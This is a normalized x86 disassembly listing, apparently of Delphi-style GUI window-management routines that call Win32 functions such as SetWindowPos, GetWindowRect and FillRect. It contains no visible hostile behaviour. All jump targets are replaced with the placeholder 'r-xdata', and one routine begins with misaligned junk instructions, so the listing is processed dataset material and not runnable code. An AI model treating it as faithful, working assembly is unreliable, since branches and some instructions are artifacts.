cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_43f2d0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_43f228
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_43f308
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43f52c
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43f228
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_403454
sub_43f3c4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_413808
pop esi
pop ebx
retn
sub_43f3e8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_43f3c4
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_41369c
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_413828
sub_43f45c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_43f52c
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_439bf4
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_43f4bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_43f520
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f527
lea eax [ ebp - 0x4 ]
call sub_4055cc
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_403454
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_4055e4
sub_43f538
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_438094
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_43f5f0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_4137ac
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_413650
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_403454
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_43f650
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_43f746
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_403454
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f74d
mov eax [ ebp - 0x14 ]
call sub_403258
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_413808
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4137ac
mov edi eax
mov eax edi
mov si 0xffb8
call sub_403454
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_43f75c
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_43f650
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_43f788
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44f7bc
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_43f650
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_43f650
mov edx eax
mov eax esi
call sub_453428
sub_43f7cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43bf58
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43bf1c
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_43f814
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_43eed0
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_438cb0
sub_43f85c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_43f8e0
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_43f52c
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_43bf58
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_43fca2
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_43bf58
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_43f85c
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_43bf1c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_43fcb9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_43f8e0
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_439a90
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_43fcf8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43a914
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_4383a8
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_43fd40
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43ab34
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_43fd70
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_43f52c
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_43bac0
xor ecx ecx
push ebp
push sub_43fe9f
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_43bf58
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_43bf58
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fea6
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_43bac8
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43bf1c
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_43fea6
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403454
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403454
jmp r-xdata
sub_43ff3c
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_439bf4
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_439bf4
sub_43ff80
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_439bf4
sub_43fff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_440080
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_4402e6
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41c9e4
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43f228
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_429004
call sub_4290e4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
